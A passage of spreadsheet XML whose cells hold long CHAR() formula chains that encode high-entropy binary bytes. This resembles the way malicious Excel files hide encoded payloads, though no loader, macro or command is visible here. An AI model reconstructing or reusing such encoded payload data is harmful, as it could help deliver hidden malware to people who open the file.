p;CHAR(3)&amp;CHAR(159)&amp;CHAR(160)&amp;CHAR(5)&amp;CHAR(29)&amp;CHAR(178)&amp;CHAR(89)&amp;CHAR(29)&amp;CHAR(151)&amp;CHAR(126)&amp;CHAR(115)&amp;CHAR(247)&amp;CHAR(16)&amp;CHAR(244)&amp;CHAR(183)&amp;CHAR(116)&amp;CHAR(71)&amp;CHAR(248)&amp;CHAR(85)&amp;CHAR(81)&amp;CHAR(5)&amp;CHAR(102)&amp;CHAR(75)&amp;CHAR(71)&amp;CHAR(143)&amp;CHAR(29)&amp;CHAR(172)&amp;CHAR(106)&amp;CHAR(169)&amp;CHAR(159)&amp;CHAR(108)&amp;CHAR(148)&amp;CHAR(134)&amp;CHAR(162)&amp;CHAR(183)&amp;CHAR(220)&amp;CHAR(133)&amp;CHAR(233)&amp;CHAR(133)&amp;CHAR(205)&amp;CHAR(48)&amp;CHAR(204)&amp;CHAR(240)&amp;CHAR(19)&amp;CHAR(70)&amp;CHAR(175)&amp;CHAR(151)&amp;CHAR(115)&amp;CHAR(138)&amp;CHAR(88)&amp;CHAR(1)&amp;CHAR(72)&amp;CHAR(133)&amp;CHAR(154)&amp;CHAR(133)&amp;CHAR(238)&amp;CHAR(232)&amp;CHAR(197)&amp;CHAR(203)&amp;CHAR(42)&amp;CHAR(17)&amp;CHAR(108)&amp;CHAR(197)&amp;CHAR(224)&amp;CHAR(81)&amp;CHAR(163)&amp;CHAR(240)&amp;CHAR(40)&amp;CHAR(175)&amp;CHAR(33)&amp;CHAR(79)&amp;CHAR(59)&amp;CHAR(180)&amp;CHAR(229)&amp;CHAR(112)&amp;CHAR(81)&amp;CHAR(254)&amp;CHAR(81)&amp;CHAR(214)&amp;CHAR(206)&amp;CHAR(177)&amp;CHAR(56)&amp;CHAR(159)&amp;CHAR(102)&amp;CHAR(30)&amp;CHAR(70)&amp;CHAR(58)&amp;CHAR(131)&amp;CHAR(30)&amp;CHAR(195)&amp;CHAR(154)&amp;CHAR(132)&amp;CHAR(73)&amp;CHAR(160)&amp;CHAR(85)&amp;CHAR(226)&amp;CHAR(96)&amp;CHAR(171)</f>
        <v>¹ÿ_x0012_;_x0004__x001D_;šôK_x0014__x001B_¦F;líguéö5Û‚”_x001F_P"´zµ ·‘2èß"•²óåÇ[¬gø¯vù_x0008_è8Cf_x001E_j0_x0017_½4®!I»_x001A_uÇ±ã(/‘4_x001B_µ	_x000E_¯_x0019_`G¬&amp;¥¡_x000C_ô0p±}¥ÉMÇ_x0006_½èMÑ_x000E_áäxùVÒ{ÆúKø–ÈÌVrpÙ;Ö^²&lt;^Z%§1[ó	O_x000E_tâoÝ§Ø¬HábCb_x0015__x0012_(%’Ÿû_x0003_Ÿ _x0005__x001D_²Y_x001D_—~s÷_x0010_ô·tGøUQ_x0005_fKG_x001D_¬j©Ÿl”†¢·Ü…é…Í0Ìð_x0013_F¯—sŠX_x0001_H…š…îèÅË*_x0011_lÅàQ£ð(¯!O;´åpQþQÖÎ±8Ÿf_x001E_F:ƒ_x001E_Ãš„I Uâ`«</v>
      </c>
      <c r="C55" t="str">
        <f>CHAR(105)&amp;CHAR(46)&amp;CHAR(251)&amp;CHAR(170)&amp;CHAR(114)&amp;CHAR(58)&amp;CHAR(218)&amp;CHAR(237)&amp;CHAR(9)&amp;CHAR(165)</f>
        <v>i.ûªr:Úí	¥</v>
      </c>
    </row>
    <row r="56" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B56" t="str">
        <f>CHAR(81)&amp;CHAR(42)&amp;CHAR(80)&amp;CHAR(218)&amp;CHAR(158)&amp;CHAR(179)&amp;CHAR(246)&amp;CHAR(166)&amp;CHAR(115)&amp;CHAR(93)&amp;CHAR(225)&amp;CHAR(34)&amp;CHAR(44)&amp;CHAR(105)&amp;CHAR(160)&amp;CHAR(209)&amp;CHAR(7)&amp;CHAR(1)&amp;CHAR(82)&amp;CHAR(137)&amp;CHAR(48)&amp;CHAR(17)&amp;CHAR(198)&amp;CHAR(119)&amp;CHAR(145)&amp;CHAR(202)&amp;CHAR(21)&amp;CHAR(214)&amp;CHAR(62)&amp;CHAR(3)&amp;CHAR(76)&amp;CHAR(169)&amp;CHAR(145)&amp;CHAR(109)&amp;CHAR(255)&amp;CHAR(65)&amp;CHAR(96)&amp;CHAR(247)&amp;CHAR(122)&amp;CHAR(168)&amp;CHAR(163)&amp;CHAR(17)&amp;CHAR(163)&amp;CHAR(137)&amp;CHAR(158)&amp;CHAR(152)&amp;CHAR(1)&amp;CHAR(52)&amp;CHAR(79)&amp;CHAR(239)&amp;CHAR(115)&amp;CHAR(110)&amp;CHAR(16)&amp;CHAR(197)&amp;CHAR(33)&amp;CHAR(77)&amp;CHAR(223)&amp;CHAR(29)&amp;CHAR(197)&amp;CHAR(96)&amp;CHAR(183)&amp;CHAR(215)&amp;CHAR(224)&amp;CHAR(182)&amp;CHAR(158)&amp;CHAR(65)&amp;CHAR(175)&amp;CHAR(199)&amp;CHAR(157)&amp;CHAR(89)&amp;CHAR(165)&amp;CHAR(5)&amp;CHAR(221)&amp;CHAR(68)&amp;CHAR(80)&amp;CHAR(153)&amp;CHAR(186)&amp;CHAR(109)&amp;CHAR(109)&amp;CHAR(93)&amp;CHAR(15)&amp;CHAR(177)&amp;CHAR(209)&amp;CHAR(73)&amp;CHAR(70)&amp;CHAR(50)&amp;CHAR(35)&amp;CHAR(45)&amp;CHAR(109)&amp;CHAR(13)&amp;CHAR(161)&amp;CHAR(75)&amp;CHAR(64)&amp;CHAR(68)&amp;CHAR(93)&amp;CHAR(187)&amp;CHAR(181)&amp;CHAR(227)&amp;CHAR(50)&amp;CHAR(106)&amp;CHAR(224)&amp;CHAR(49)&amp;CHAR(130)&amp;CHAR(55)&amp;CHAR(214)&amp;CHAR(51)&amp;CHAR(30)&amp;CHAR(229)&amp;CHAR(207)&amp;CHAR(6)&amp;CHAR(95)&amp;CHAR(75)&amp;CHAR(253)&amp;CHAR(235)&amp;CHAR(69)&amp;CHAR(25)&amp;CHAR(189)&amp;CHAR(68)&amp;CHAR(113)&amp;CHAR(11)&amp;CHAR(158)&amp;CHAR(239)&amp;CHAR(218)&amp;CHAR(234)&amp;CHAR(230)&amp;CHAR(96)&amp;CHAR(194)&amp;CHAR(196)&amp;CHAR(22)&amp;CHAR(39)&amp;CHAR(229)&amp;CHAR(129)&amp;CHAR(235)&amp;CHAR(27)&amp;CHAR(182)&amp;CHAR(126)&amp;CHAR(90)&amp;CHAR(28)&amp;CHAR(190)&amp;CHAR(246)&amp;CHAR(200)&amp;CHAR(20)&amp;CHAR(174)&amp;CHAR(221)&amp;CHAR(132)&amp;CHAR(83)&amp;CHAR(97)&amp;CHAR(79)&amp;CHAR(17)&amp;CHAR(131)&amp;CHAR(159)&amp;CHAR(192)&amp;CHAR(70)&amp;CHAR(54)&amp;CHAR(97)&amp;CHAR(48)&amp;CHAR(90)&amp;CHAR(236)&amp;CHAR(78)&amp;CHAR(22)&amp;CHAR(134)&amp;CHAR(196)&amp;CHAR(182)&amp;CHAR(65)&amp;CHAR(242)&amp;CHAR(201)&amp;CHAR(133)&amp;CHAR(34)&amp;CHAR(174)&amp;CHAR(201)&amp;CHAR(243)&amp;CHAR(202)&amp;CHAR(178)&amp;CHAR(55)&amp;CHAR(250)&amp;CHAR(123)&amp;CHAR(222)&amp;CHAR(136)&amp;CHAR(102)&amp;CHAR(210)&amp;CHAR(187)&amp;CHAR(78)&amp;CHAR(81)&amp;CHAR(138)&amp;CHAR(132)&amp;CHAR(140)&amp;CHAR(178)&amp;CHAR(227)&amp;CHAR(208)&amp;CHAR(85)&amp;CHAR(242)&amp;CHAR(79)&amp;CHAR(244)&amp;CHAR(186)&amp;CHAR(47)&amp;CHAR(182)&amp;CHAR(101)&amp;CHAR(147)&amp;CHAR(167)&amp;CHAR(61)&amp;CHAR(62)&amp;CHAR(160)&amp;CHAR(227)&amp;CHAR(80)&amp;CHAR(253)&amp;CHAR(45)&amp;CHAR(100)&amp;CHAR(193)&amp;CHAR(99)&amp;CHAR(157)&amp;CHAR(44)&amp;CHAR(157)&amp;CHAR(245)&amp;CHAR(188)&amp;CHAR(104)&amp;CHAR(6)&amp;CHAR(110)&amp;CHAR(19)&amp;CHAR(187)&amp;CHAR(11)&amp;CHAR(203)&amp;CHAR(103)&amp;CHAR(105)&amp;CHAR(201)&amp;CHAR(99)&amp;CHAR(102)&amp;CHAR(139)&amp;CHAR(254)&amp;CHAR(7)&amp;CHAR(70)&amp;CHAR(42)&amp;CHAR(138)&amp;CHAR(117)&amp;CHAR(187)&amp;CHAR(143)&amp;CHAR(138)&amp;CHAR(93)&amp;CHAR(54)&amp;CHAR(25)&amp;CHAR(142)&amp;CHAR(41)&amp;CHAR(16)&amp;CHAR(98)&amp;CHAR(2)&amp;CHAR(2)&amp;CHAR(181)&amp;CHAR(117)&amp;CHAR(249)&amp;CHAR(183)&amp;CHAR(110)&amp;CHAR(18)&amp;CHAR(77)&amp;CHAR(245)&amp;CHAR(157)&amp;CHAR(4)</f>
        <v>Q*PÚž³ö¦s]á",i Ñ_x0007__x0001_R‰0_x0011_Æw‘Ê_x0015_Ö&gt;_x0003_L©‘mÿA`÷z¨£_x0011_£‰ž˜_x0001_4Oïsn_x0010_Å!Mß_x001D_Å`·×à¶žA¯ÇY¥_x0005_ÝDP™ºmm]_x000F_±ÑIF2#-m_x000D_¡K@D]»µã2jà1‚7Ö3_x001E_åÏ_x0006__KýëE_x0019_½Dq_x000B_žïÚêæ`ÂÄ_x0016_'åë_x001B_¶~Z_x001C_¾öÈ_x0014_®Ý„SaO_x0011_ƒŸÀF6a0ZìN_x0016_†Ä¶AòÉ…"®ÉóÊ²7ú{ÞˆfÒ»NQŠ„Œ²ãÐUòOôº/¶e“§=&gt; ãPý-dÁc,õ¼h_x0006_n_x0013_»_x000B_ËgiÉcf‹þ_x0007_F*Šu»Š]6_x0019_Ž)_x0010_b_x0002__x0002_µuù·n_x0012_Mõ_x0004_</v>
      </c>
      <c r="C56" t="str">
        <f>CHAR(251)&amp;CHAR(207)&amp;CHAR(119)&amp;CHAR(50)&amp;CHAR(23)&amp;CHAR(160)&amp;CHAR(109)&amp;CHAR(40)&amp;CHAR(254)&amp;CHAR(101)</f>
        <v>ûÏw2_x0017_ m(þe</v>
      </c>
    </row>
    <row r="57" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B57" t="str">
        <f>CHAR(49)&amp;CHAR(83)&amp;CHAR(100)&amp;CHAR(232)&amp;CHAR(226)&amp;CHAR(174)&amp;CHAR(75)&amp;CHAR(21)&amp;CHAR(18)&amp;CHAR(95)&amp;CHAR(109)&amp;CHAR(27)&amp;CHAR(70)&amp;CHAR(110)&amp;CHAR(141)&amp;CHAR(223)&amp;CHAR(19)&amp;CHAR(206)&amp;CHAR(194)&amp;CHAR(82)&amp;CHAR(91)&amp;CHAR(106)&amp;CHAR(47)&amp;CHAR(153)&amp;CHAR(160)&amp;CHAR(132)&amp;CHAR(160)&amp;CHAR(249)&amp;CHAR(37)&amp;CHAR(72)&amp;CHAR(176)&amp;CHAR(145)&amp;CHAR(127)&amp;CHAR(68)&amp;CHAR(223)&amp;CHAR(96)&amp;CHAR(84)&amp;CHAR(79)&amp;CHAR(34)&amp;CHAR(89)&amp;CHAR(130)&amp;CHAR(29)&amp;CHAR(100)&amp;CHAR(95)&amp;CHAR(195)&amp;CHAR(53)&amp;CHAR(248)&amp;CHAR(248)&amp;CHAR(81)&amp;CHAR(81)&amp;CHAR(157)&amp;CHAR(21)&amp;CHAR(201)&amp;CHAR(236)&amp;CHAR(33)&amp;CHAR(210)&amp;CHAR(156)&amp;CHAR(109)&amp;CHAR(181)&amp;CHAR(140)&amp;CHAR(25)&amp;CHAR(78)&amp;CHAR(114)&amp;CHAR(105)&amp;CHAR(149)&amp;CHAR(23)&amp;CHAR(86)&amp;CHAR(169)&amp;CHAR(186)&amp;CHAR(113)&amp;CHAR(118)&amp;CHAR(52)&amp;CHAR(211)&amp;CHAR(248)&amp;CHAR(104)&amp;CHAR(162)&amp;CHAR(240)&amp;CHAR(33)&amp;CHAR(220)&amp;CHAR(77)&amp;CHAR(208)&amp;CHAR(121)&amp;CHAR(36)&amp;CHAR(148)&amp;CHAR(138)&amp;CHAR(186)&amp;CHAR(83)&amp;CHAR(205)&amp;CHAR(53)&amp;CHAR(177)&amp;CHAR(64)&amp;CHAR(94)&amp;CHAR(252)&amp;CHAR(151)&amp;CHAR(115)&amp;CHAR(83)&amp;CHAR(131)&amp;CHAR(227)&amp;CHAR(71)&amp;CHAR(108)&amp;CHAR(80)&amp;CHAR(127)&amp;CHAR(68)&amp;CHAR(185)&amp;CHAR(61)&amp;CHAR(187)&amp;CHAR(57)&amp;CHAR(243)&amp;CHAR(53)&amp;CHAR(175)&amp;CHAR(208)&amp;CHAR(4)&amp;CHAR(10)&amp;CHAR(122)&amp;CHAR(70)&amp;CHAR(159)&amp;CHAR(131)&amp;CHAR(252)&amp;CHAR(39)&amp;CHAR(111)&amp;CHAR(221)&amp;CHAR(131)&amp;CHAR(59)&amp;CHAR(180)&amp;CHAR(104)&amp;CHAR(186)&amp;CHAR(241)&amp;CHAR(170)&amp;CHAR(249)&amp;CHAR(17)&amp;CHAR(82)&amp;CHAR(132)&amp;CHAR(29)&amp;CHAR(73)&amp;CHAR(22)&amp;CHAR(51)&amp;CHAR(219)&amp;CHAR(170)&amp;CHAR(94)&amp;CHAR(34)&amp;CHAR(6)&amp;CHAR(16)&amp;CHAR(62)&amp;CHAR(56)&amp;CHAR(226)&amp;CHAR(237)&amp;CHAR(46)&amp;CHAR(58)&amp;CHAR(156)&amp;CHAR(180)&amp;CHAR(33)&amp;CHAR(134)&amp;CHAR(133)&amp;CHAR(95)&amp;CHAR(59)&amp;CHAR(114)&amp;CHAR(15)&amp;CHAR(251)&amp;CHAR(89)&amp;CHAR(173)&amp;CHAR(171)&amp;CHAR(11)&amp;CHAR(202)&amp;CHAR(212)&amp;CHAR(209)&amp;CHAR(37)&amp;CHAR(206)&amp;CHAR(188)&amp;CHAR(4)&amp;CHAR(33)&amp;CHAR(194)&amp;CHAR(221)&amp;CHAR(182)&amp;CHAR(74)&amp;CHAR(233)&amp;CHAR(179)&amp;CHAR(11)&amp;CHAR(29)&amp;CHAR(187)&amp;CHAR(27)&amp;CHAR(119)&amp;CHAR(147)&amp;CHAR(37)&amp;CHAR(226)&amp;CHAR(114)&amp;CHAR(30)&amp;CHAR(18)&amp;CHAR(197)&amp;CHAR(24)&amp;CHAR(96)&amp;CHAR(27)&amp;CHAR(131)&amp;CHAR(17)&amp;CHAR(69)&amp;CHAR(104)&amp;CHAR(53)&amp;CHAR(35)&amp;CHAR(69)&amp;CHAR(82)&amp;CHAR(91)&amp;CHAR(41)&amp;CHAR(192)&amp;CHAR(150)&amp;CHAR(139)&amp;CHAR(53)&amp;CHAR(209)&amp;CHAR(169)&amp;CHAR(155)&amp;CHAR(253)&amp;CHAR(82)&amp;CHAR(217)&amp;CHAR(163)&amp;CHAR(215)&amp;CHAR(201)&amp;CHAR(72)&amp;CHAR(177)&amp;CHAR(245)&amp;CHAR(230)&amp;CHAR(238)&amp;CHAR(234)&amp;CHAR(211)&amp;CHAR(146)&amp;CHAR(137)&amp;CHAR(80)&amp;CHAR(174)&amp;CHAR(119)&amp;CHAR(21)&amp;CHAR(117)&amp;CHAR(217)&amp;CHAR(168)&amp;CHAR(142)&amp;CHAR(35)&amp;CHAR(215)&amp;CHAR(255)&amp;CHAR(190)&amp;CHAR(230)&amp;CHAR(127)&amp;CHAR(68)&amp;CHAR(142)&amp;CHAR(182)&amp;CHAR(250)&amp;CHAR(223)&amp;CHAR(25)&amp;CHAR(58)&amp;CHAR(211)&amp;CHAR(253)&amp;CHAR(96)&amp;CHAR(219)&amp;CHAR(154)&amp;CHAR(42)&amp;CHAR(63)&amp;CHAR(79)&amp;CHAR(219)&amp;CHAR(115)&amp;CHAR(134)</f>
        <v>1Sdèâ®K_x0015__x0012__m_x001B_Fnß_x0013_ÎÂR[j/™ „ ù%H°‘Dß`TO"Y‚_x001D_d_Ã5øøQQ_x0015_Éì!ÒœmµŒ_x0019_Nri•_x0017_V©ºqv4Óøh¢ð!ÜMÐy$”ŠºSÍ5±@^ü—sSƒãGlPD¹=»9ó5¯Ð_x0004_
zFŸƒü'oÝƒ;´hºñªù_x0011_R„_x001D_I_x0016_3Ûª^"_x0006__x0010_&gt;8âí.:œ´!†…_;r_x000F_ûY­«_x000B_ÊÔÑ%Î¼_x0004_!ÂÝ¶Jé³_x000B__x001D_»_x001B_w“%âr_x001E__x0012_Å_x0018_`_x001B_ƒ_x0011_Eh5#ER[)À–‹5Ñ©›ýRÙ£×ÉH±õæîêÓ’‰P®w_x0015_uÙ¨Ž#×ÿ¾æDŽ¶úß_x0019_:Óý`Ûš*?OÛs†</v>
      </c>
      <c r="C57" t="str">
        <f>CHAR(58)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(128)&amp;CHAR(172)&amp;CHAR(176)&amp;CHAR(72)&amp;CHAR(203)&amp;CHAR(62)&amp;CHAR(177)</f>
        <v>:±Ö€¬°HË&gt;±</v>
      </c>
    </row>
    <row r="58" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B58" t="str">
        <f>CHAR(223)&amp;CHAR(142)&amp;CHAR(60)&amp;CHAR(231)&amp;CHAR(230)&amp;CHAR(94)&amp;CHAR(81)&amp;CHAR(27)&amp;CHAR(119)&amp;CHAR(170)&amp;CHAR(62)&amp;CHAR(180)&amp;CHAR(214)&amp;CHAR(118)&amp;CHAR(206)&amp;CHAR(243)&amp;CHAR(204)&amp;CHAR(116)&amp;CHAR(48)&amp;CHAR(205)&amp;CHAR(36)&amp;CHAR(5)&amp;CHAR(220)&amp;CHAR(54)&amp;CHAR(107)&amp;CHAR(213)&amp;CHAR(142)&amp;CHAR(85)&amp;CHAR(92)&amp;CHAR(186)&amp;CHAR(40)&amp;CHAR(114)&amp;CHAR(86)&amp;CHAR(124)&amp;CHAR(242)&amp;CHAR(139)&amp;CHAR(78)&amp;CHAR(172)&amp;CHAR(255)&amp;CHAR(131)&amp;CHAR(51)&amp;CHAR(66)&amp;CHAR(16)&amp;CHAR(204)&amp;CHAR(185)&amp;CHAR(107)&amp;CHAR(110)&amp;CHAR(78)&amp;CHAR(235)&amp;CHAR(10)&amp;CHAR(177)&amp;CHAR(20)&amp;CHAR(90)&amp;CHAR(135)&amp;CHAR(35)&amp;CHAR(162)&amp;CHAR(152)&amp;CHAR(72)&amp;CHAR(229)&amp;CHAR(55)&amp;CHAR(86)&amp;CHAR(221)&amp;CHAR(177)&amp;CHAR(43)&amp;CHAR(72)&amp;CHAR(164)&amp;CHAR(210)&amp;CHAR(115)&amp;CHAR(239)&amp;CHAR(225)&amp;CHAR(143)&amp;CHAR(126)&amp;CHAR(15)&amp;CHAR(42)&amp;CHAR(118)&amp;CHAR(76)&amp;CHAR(51)&amp;CHAR(109)&amp;CHAR(145)&amp;CHAR(135)&amp;CHAR(99)&amp;CHAR(245)&amp;CHAR(177)&amp;CHAR(178)&amp;CHAR(101)&amp;CHAR(91)&amp;CHAR(119)&amp;CHAR(228)&amp;CHAR(27)&amp;CHAR(254)&amp;CHAR(60)&amp;CHAR(226)&amp;CHAR(177)&amp;CHAR(144)&amp;CHAR(156)&amp;CHAR(39)&amp;CHAR(183)&amp;CHAR(161)&amp;CHAR(108)&amp;CHAR(35)&amp;CHAR(119)&amp;CHAR(29)&amp;CHAR(7)&amp;CHAR(170)&amp;CHAR(230)&amp;CHAR(203)&amp;CHAR(198)&amp;CHAR(115)&amp;CHAR(70)&amp;CHAR(247)&amp;CHAR(55)&amp;CHAR(50)&amp;CHAR(82)&amp;CHAR(40)&amp;CHAR(200)&amp;CHAR(109)&amp;CHAR(225)&amp;CHAR(140)&amp;CHAR(87)&amp;CHAR(109)&amp;CHAR(130)&amp;CHAR(177)&amp;CHAR(61)&amp;CHAR(124)&amp;CHAR(63)&amp;CHAR(163)&amp;CHAR(56)&amp;CHAR(42)&amp;CHAR(219)&amp;CHAR(176)&amp;CHAR(82)&amp;CHAR(133)&amp;CHAR(35)&amp;CHAR(139)&amp;CHAR(74)&amp;CHAR(73)&amp;CHAR(252)&amp;CHAR(223)&amp;CHAR(19)&amp;CHAR(92)&amp;CHAR(210)&amp;CHAR(53)&amp;CHAR(27)&amp;CHAR(177)&amp;CHAR(84)&amp;CHAR(49)&amp;CHAR(61)&amp;CHAR(179)&amp;CHAR(1)&amp;CHAR(115)&amp;CHAR(153)&amp;CHAR(228)&amp;CHAR(52)&amp;CHAR(162)&amp;CHAR(144)&amp;CHAR(78)&amp;CHAR(242)&amp;CHAR(194)&amp;CHAR(175)&amp;CHAR(215)&amp;CHAR(159)&amp;CHAR(197)&amp;CHAR(253)&amp;CHAR(114)&amp;CHAR(70)&amp;CHAR(117)&amp;CHAR(224)&amp;CHAR(81)&amp;CHAR(185)&amp;CHAR(173)&amp;CHAR(18)&amp;CHAR(63)&amp;CHAR(253)&amp;CHAR(250)&amp;CHAR(220)&amp;CHAR(137)&amp;CHAR(6)&amp;CHAR(171)&amp;CHAR(33)&amp;CHAR(229)&amp;CHAR(143)&amp;CHAR(185)&amp;CHAR(115)&amp;CHAR(211)&amp;CHAR(70)&amp;CHAR(120)&amp;CHAR(22)&amp;CHAR(250)&amp;CHAR(58)&amp;CHAR(40)&amp;CHAR(49)&amp;CHAR(14)&amp;CHAR(146)&amp;CHAR(192)&amp;CHAR(43)&amp;CHAR(147)&amp;CHAR(120)&amp;CHAR(177)&amp;CHAR(194)&amp;CHAR(239)&amp;CHAR(102)&amp;CHAR(79)&amp;CHAR(31)&amp;CHAR(233)&amp;CHAR(29)&amp;CHAR(143)&amp;CHAR(179)&amp;CHAR(36)&amp;CHAR(133)&amp;CHAR(117)&amp;CHAR(87)&amp;CHAR(166)&amp;CHAR(181)&amp;CHAR(102)&amp;CHAR(215)&amp;CHAR(116)&amp;CHAR(214)&amp;CHAR(138)&amp;CHAR(122)&amp;CHAR(61)&amp;CHAR(1)&amp;CHAR(177)&amp;CHAR(119)&amp;CHAR(158)&amp;CHAR(237)&amp;CHAR(255)&amp;CHAR(61)&amp;CHAR(156)&amp;CHAR(137)&amp;CHAR(128)&amp;CHAR(213)&amp;CHAR(226)&amp;CHAR(217)&amp;CHAR(13)&amp;CHAR(235)&amp;CHAR(179)&amp;CHAR(33)&amp;CHAR(138)&amp;CHAR(92)&amp;CHAR(84)&amp;CHAR(69)&amp;CHAR(69)&amp;CHAR(18)&amp;CHAR(155)&amp;CHAR(242)&amp;CHAR(158)&amp;CHAR(81)&amp;CHAR(173)&amp;CHAR(146)&amp;CHAR(11)&amp;CHAR(104)&amp;CHAR(98)&amp;CHAR(160)&amp;CHAR(102)&amp;CHAR(153)</f>
        <v>ßŽ&lt;çæ^Q_x001B_wª&gt;´ÖvÎóÌt0Í$_x0005_Ü6kÕŽU\º(rV|ò‹N¬ÿƒ3B_x0010_Ì¹knNë
±_x0014_Z‡#¢˜Hå7VÝ±+H¤Òsïá~_x000F_*vL3m‘‡cõ±²e[wä_x001B_þ&lt;â±œ'·¡l#w_x001D__x0007_ªæËÆsF÷72R(ÈmáŒWm‚±=|?£8*Û°R…#‹JIüß_x0013_\Ò5_x001B_±T1=³_x0001_s™ä4¢NòÂ¯×ŸÅýrFuàQ¹­_x0012_?ýúÜ‰_x0006_«!å¹sÓFx_x0016_ú:(1_x000E_’À+“x±ÂïfO_x001F_é_x001D_³$…uW¦µf×tÖŠz=_x0001_±wžíÿ=œ‰€ÕâÙ_x000D_ë³!Š\TEE_x0012_›òžQ­’_x000B_hb f™</v>
      </c>
      <c r="C58" t="str">
        <f>CHAR(179)&amp;CHAR(128)&amp;CHAR(170)&amp;CHAR(169)&amp;CHAR(222)&amp;CHAR(231)&amp;CHAR(62)&amp;CHAR(177)&amp;CHAR(214)&amp;CHAR(128)</f>
        <v>³€ª©Þç&gt;±Ö€</v>
      </c>
    </row>
    <row r="59" spans="2:3" x14ac:dyDescent="0.25">
      <c r="B59" t="str">
        <f>CHAR(255)&amp;CHAR(246)&amp;CHAR(192)&amp;CHAR(219)&amp;CHAR(44)&amp;CHAR(177)&amp;CHAR(79)&amp;CHAR(190)&amp;CHAR(96)&amp;CHAR(184)&amp;CHAR(114)&amp;CHAR(73)&amp;CHAR(60)&amp;CHAR(227)&amp;CHAR(181)&amp;CHAR(15)&amp;CHAR(55)&amp;CHAR(218)&amp;CHAR(252)&amp;CHAR(39)&amp;CHAR(94)&amp;CHAR(243)&amp;CHAR(152)&amp;CHAR(102)&amp;CHAR(221)&amp;CHAR(150)&amp;CHAR(232)&amp;CHAR(14)&amp;CHAR(233)&amp;CHAR(130)&amp;CHAR(254)&amp;CHAR(89)&amp;CHAR(199)&amp;CHAR(23)&amp;CHAR(233)&amp;CHAR(83)&amp;CHAR(105)&amp;CHAR(147)&amp;CHAR(16)&amp;CHAR(134)&amp;CHAR(165)&amp;CHAR(187)&amp;CHAR(27)&amp;CHAR(196)&amp;CHAR(137)&amp;CHAR(28)&amp;CHAR(255)&amp;CHAR(103)&amp;CHAR(64)&amp;CHAR(92)&amp;CHAR(23)&amp;CHAR(104)&amp;CHAR(173)&amp;CHAR(152)&amp;CHAR(201)&amp;CHAR(180)&amp;CHAR(60)&amp;CHAR(51)&amp;CHAR(117)&amp;CHAR(24)&amp;CHAR(32)&amp;CHAR(81)&amp;CHAR(225)&amp;CHAR(39)&amp;CHAR(165)&amp;CHAR(208)&amp;CHAR(128)&amp;CHAR(107)&amp;CHAR(160)&amp;CHAR(236)&amp;CHAR(213)&amp;CHAR(122)&amp;CHAR(74)&amp;CHAR(80)&amp;CHAR(35)&amp;CHAR(57)&amp;CHAR(135)&amp;CHAR(247)&amp;CHAR(7)&amp;CHAR(10)&amp;CHAR(13)&amp;CHAR(113)&amp;CHAR(35)&amp;CHAR(240)&amp;CHAR(148)&amp;CHAR(217)&amp;CHAR(186)&amp;CHAR(4)&amp;CHAR(210)&amp;CHAR(92)&amp;CHAR(110)&amp;CHAR(53)&amp;CHAR(10)&amp;CHAR(116)&amp;CHAR(144)&amp;CHAR(53)&amp;CHAR(59)&amp;CHAR(181)&amp;CHAR(195)&amp;CHAR(252)&amp;CHAR(83)&amp;CHAR(74)&amp;CHAR(103)&amp;CHAR(124)&amp;CHAR(73)&amp;CHAR(159)&amp;CHAR(225)&amp;CHAR(236)&amp;CHAR(145)&amp;CHAR(173)&amp;CHAR(29)&amp;CHAR(97)&amp;CHAR(88)&amp;CHAR(149)&amp;CHAR(32)&amp;CHAR(31)&amp;CHAR(29)&amp;CHAR(154)&amp;CHAR(189)&amp;CHAR(104)&amp;CHAR(80)&amp;CHAR(24)&amp;CHAR(234)&amp;CHAR(125)&amp;CHAR(109)&amp;CHAR(131)&amp;CHAR(102)&amp;CHAR(41)&amp;CHAR(251)&amp;CHAR(70)&amp;CHAR(214)&amp;CHAR(95)&amp;CHAR(174)&amp;CHAR(3)&amp;CHAR(138)&amp;CHAR(231)&amp;CHAR(219)&amp;CHAR(27)&amp;CHAR(202)&amp;CHAR(75)&amp;CHAR(211)&amp;CHAR(83)&amp;CHAR(105)&amp;CHAR(255)&amp;CHAR(216)&amp;CHAR(222)&amp;CHAR(227)&amp;CHAR(147)&amp;CHAR(158)&amp;CHAR(247)&amp;CHAR(67)&amp;CHAR(164)&amp;CHAR(4)&amp;CHAR(238)&amp;CHAR(98)&amp;CHAR(220)&amp;CHAR(90)&amp;CHAR(192)&amp;CHAR(4)&amp;CHAR(9)&amp;CHAR(124)&amp;CHAR(200)&amp;CHAR(140)&amp;CHAR(159)&amp;CHAR(24)&amp;CHAR(6)&amp;CHAR(94)&amp;CHAR(249)&amp;CHAR(229)&amp;CHAR(148)&amp;CHAR(126)&amp;CHAR(40)&amp;CHAR(45)&amp;CHAR(154)&amp;CHAR(38)&amp;CHAR(21)&amp;CHAR(227)&amp;CHAR(26)&amp;CHAR(30)&amp;CHAR(24)&amp;CHAR(19)&amp;CHAR(180)&amp;CHAR(238)&amp;CHAR(111)&amp;CHAR(168)&amp;CHAR(240)&amp;CHAR(240)&amp;CHAR(39)&amp;CHAR(158)&amp;CHAR(84)&amp;CHAR(141)&amp;CHAR(50)&amp;CHAR(87)&amp;CHAR(69)&amp;CHAR(96)&amp;CHAR(65)&amp;CHAR(151)&amp;CHAR(191)&amp;CHAR(49)&amp;CHAR(238)&amp;CHAR(192)&amp;CHAR(170)&amp;CHAR(176)&amp;CHAR(98)&amp;CHAR(167)&amp;CHAR(215)&amp;CHAR(215)&amp;CHAR(60)&amp;CHAR(4)&amp;CHAR(149)&amp;CHAR(107)&amp;CHAR(148)&amp;CHAR(197)&amp;CHAR(188)&amp;CHAR(241)&amp;CHAR(175)&amp;CHAR(188)&amp;CHAR(73)&amp;CHAR(21)&amp;CHAR(247)&amp;CHAR(117)&amp;CHAR(249)&amp;CHAR(172)&amp;CHAR(226)&amp;CHAR(196)&amp;CHAR(222)&amp;CHAR(235)&amp;CHAR(23)&amp;CHAR(214)&amp;CHAR(68)&amp;CHAR(46)&amp;CHAR(45)&amp;CHAR(56)&amp;CHAR(126)&amp;CHAR(160)&amp;CHAR(200)&amp;CHAR(165)&amp;CHAR(86)&amp;CHAR(83)&amp;CHAR(87)&amp;CHAR(145)&amp;CHAR(128)&amp;CHAR(123)&amp;CHAR(187)&amp;CHAR(136)&amp;CHAR(222)&amp;CHAR(215)&amp;CHAR(231)&amp;CHAR(2)&amp;CHAR(83)&amp;CHAR(87)&amp;CHAR(224)&amp;CHAR(98)&amp;CHAR(21)&amp;CHAR(250)</f>
